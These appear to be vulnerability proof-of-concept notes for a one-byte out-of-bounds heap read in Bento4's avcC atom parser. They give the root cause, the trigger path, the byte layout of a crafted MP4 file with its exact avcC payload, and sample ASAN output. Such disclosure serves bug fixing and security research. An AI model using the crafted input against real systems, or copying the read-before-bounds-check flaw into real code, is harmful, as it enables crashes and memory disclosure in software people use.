# VULN 002 — PoC Notes

## Vulnerability

- **File**: `Bento4/Source/C++/Core/Ap4AvccAtom.h`
- **Function**: `AP4_AvccAtom::Create(AP4_UI32 size, AP4_ByteStream& stream)`
- **Lines**: 88–89
- **Type**: CWE-125 Out-of-Bounds Heap Read (1 byte)

## Root Cause

`AP4_AvccAtom::Create` reads the raw `avcC` atom payload into a heap buffer whose size is `payload_size = size - 8` bytes. For `size=14`, `payload_size=6`.

The parser then:
1. Reads `configurationVersion`, `avcProfileIndication`, etc. from `payload[0..4]`.
2. Reads `payload[5]` → `numSequenceParameterSets = payload[5] & 0x1f`.
3. Loops `numSequenceParameterSets` times to read sequence parameter sets.

If `numSequenceParameterSets == 0` (achieved by setting `payload[5] = 0xE0`, whose low 5 bits are 0), the loop runs **zero iterations**, leaving `cursor = 6 = payload_size`.

**Line 88** then executes:
```cpp
AP4_UI08 num_pps = payload[cursor++];   // cursor==6, payload_size==6 → OOB
```
before **line 89** performs the bounds check:
```cpp
if (cursor >= payload_size) break;       // check is too late
```
This is a classic post-read bounds check, resulting in a 1-byte OOB heap read.

## Trigger Path

```
mp42aac main()
  └─ AP4_File::AP4_File(stream)
       └─ AP4_AtomFactory::CreateAtomFromStream()
            └─ AP4_AvccAtom::Create(size=14, stream)
                 └─ payload[cursor++]  ← OOB at cursor==6, payload_size==6
```

## MP4 Structure

The crafted file embeds a valid-looking H.264 track with an `avcC` box at the leaf:

```
ftyp (16 B)
moov (549 B)
  mvhd (108 B)
  trak (433 B)
    tkhd  (92 B)
    mdia (333 B)
      mdhd  (32 B)
      hdlr  (33 B)
      minf (260 B)
        vmhd  (20 B)
        dinf  (36 B)
          dref (28 B)
        stbl (196 B)
          stsd (120 B)
            avc1 (104 B)
              [82 B VisualSampleEntry body]
              avcC (14 B)  ← trigger
                payload = 01 42 00 1e ff e0
```

**avcC payload breakdown**:
| Byte | Value | Meaning |
|------|-------|---------|
| 0    | 0x01  | configurationVersion |
| 1    | 0x42  | AVCProfileIndication (Baseline) |
| 2    | 0x00  | profile_compatibility |
| 3    | 0x1E  | AVCLevelIndication (3.0) |
| 4    | 0xFF  | reserved(6)=1s, lengthSizeMinusOne=3 |
| 5    | 0xE0  | reserved(3)=1s, **numSequenceParameterSets=0** |

## Expected Crash Under ASAN

ASAN should report a `heap-buffer-overflow` (READ of size 1) at the call to `AP4_AvccAtom::Create`, with a stack trace rooted in `AP4_AtomFactory::CreateAtomFromStream`.

Example (approximate):
```
==PID== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 1 at 0x... thread T0
    #0 0x... in AP4_AvccAtom::Create(...)  Ap4AvccAtom.h:88
    #1 0x... in AP4_AtomFactory::CreateAtomFromStream(...)
    ...
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in AP4_AvccAtom::Create
```
